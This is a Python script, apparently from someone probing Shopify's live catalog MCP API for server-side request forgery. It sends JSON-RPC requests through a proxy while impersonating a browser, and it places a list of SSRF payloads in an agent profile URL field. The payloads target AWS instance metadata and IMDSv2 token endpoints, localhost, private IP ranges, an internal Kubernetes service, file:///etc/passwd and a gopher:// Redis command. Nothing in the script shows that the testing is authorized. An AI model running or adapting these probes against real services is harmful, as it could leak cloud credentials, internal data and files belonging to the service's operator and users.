# -*- coding: utf-8 -*-
"""SSRF 测试:MCP profile URL 是否可指向任意地址(云 metadata/内网/本机)"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}

url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "resources/list", "id": 1,
        "params": {"meta": {"ucp-agent": {"profile": profile}}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=20)
        dt = time.time() - t0
        print(f"[{label}] HTTP {r.status_code} {dt:.1f}s | {r.text[:300]}")
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__} {e}")

if __name__ == "__main__":
    profiles = [
        ("基线-合法profile", "https://shopify.dev/ucp/agent-profiles/2026-04-08/personal_agent.json"),
        ("外网-httpbin", "http://httpbin.org/anything"),
        ("AWS-metadata", "http://169.254.169.254/latest/meta-data/"),
        ("AWS-imdsv2-token", "http://169.254.169.254/latest/api/token"),
        ("本机-127", "http://127.0.0.1/"),
        ("本机-localhost", "http://localhost/"),
        ("内网-0.0.0.0", "http://0.0.0.0/"),
        ("K8s-internal", "http://collector.tracing-production-proxy.svc.cluster.local.:4317"),
        ("file协议", "file:///etc/passwd"),
        ("gopher协议", "gopher://127.0.0.1:6379/_INFO"),
        ("https-ip直连", "https://169.254.169.254/latest/meta-data/"),
        ("内网IP段", "http://10.0.0.1/"),
        ("内网IP段2", "http://172.16.0.1/"),
        ("内网IP段3", "http://192.168.0.1/"),
        ("DNS-rebind测试域", "http://example.com/"),
    ]
    for label, p in profiles:
        probe(label, p)
        time.sleep(0.5)
